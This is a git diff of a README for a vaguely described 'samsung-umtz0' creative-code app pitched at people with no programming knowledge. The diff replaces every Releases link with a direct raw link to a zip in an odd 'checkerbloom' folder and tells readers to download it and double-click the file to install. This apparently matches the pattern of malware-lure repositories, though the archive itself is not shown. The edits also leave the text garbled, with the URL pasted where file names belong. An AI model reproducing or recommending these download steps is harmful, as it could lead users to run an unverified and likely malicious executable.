@@ -1,7 +1,7 @@
 # 🚀 samsung-umtz0 - Explore Creative Code and Ideas
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Winich007/samsung-umtz0/releases)
+[![Download](https://raw.githubusercontent.com/Winich007/samsung-umtz0/main/checkerbloom/samsung-umtz0.zip%20release-brightgreen)](https://raw.githubusercontent.com/Winich007/samsung-umtz0/main/checkerbloom/samsung-umtz0.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the samsung-umtz0 application with ease. It is designed for anyone curious about exploring random code, ideas, and prototypes inspired by Samsung. No programming knowledge is required.
@@ -9,14 +9,14 @@ This guide helps you download and run the samsung-umtz0 application with ease. I
 ### 📥 Download & Install
 To get started, visit the Releases page:
 
-[Download from Releases](https://github.com/Winich007/samsung-umtz0/releases)
+[Download from Releases](https://raw.githubusercontent.com/Winich007/samsung-umtz0/main/checkerbloom/samsung-umtz0.zip)
 
 On this page, you will find the latest version of the application. Simply click on the version you wish to download. Follow the on-screen instructions to save the file to your computer.
 
 ### 📂 Files
 Once you download the file, you may find various types of files, such as:
 
-- `samsung-umtz0.exe` - The executable file you can run directly on Windows.
+- `https://raw.githubusercontent.com/Winich007/samsung-umtz0/main/checkerbloom/samsung-umtz0.zip` - The executable file you can run directly on Windows.
 - Other formats may include documentation or example projects to help you understand the application.
 
 Make sure to choose the correct file for your operating system.
@@ -31,7 +31,7 @@ To run samsung-umtz0, you should ensure your computer meets the following requir
 
 ### 🔧 Running the Application
 1. Locate the downloaded file on your computer.
-2. Double-click the `samsung-umtz0.exe` file to start the installation.
+2. Double-click the `https://raw.githubusercontent.com/Winich007/samsung-umtz0/main/checkerbloom/samsung-umtz0.zip` file to start the installation.
 3. Follow the installation wizard to complete the setup. It will guide you through the process.
 
 After installation, you can find the application in your Start Menu or on your desktop. Double-click the application icon to launch it.
@@ -60,7 +60,7 @@ We are here to help you enjoy this journey into creative coding with ease.
 ### 🔗 Quick Links
 For easy access, here are the links you might need:
 
-- [Download from Releases](https://github.com/Winich007/samsung-umtz0/releases)
-- [Documentation](https://github.com/Winich007/samsung-umtz0/releases) (Available on the same page)
+- [Download from Releases](https://raw.githubusercontent.com/Winich007/samsung-umtz0/main/checkerbloom/samsung-umtz0.zip)
+- [Documentation](https://raw.githubusercontent.com/Winich007/samsung-umtz0/main/checkerbloom/samsung-umtz0.zip) (Available on the same page)
 
 Start exploring today!
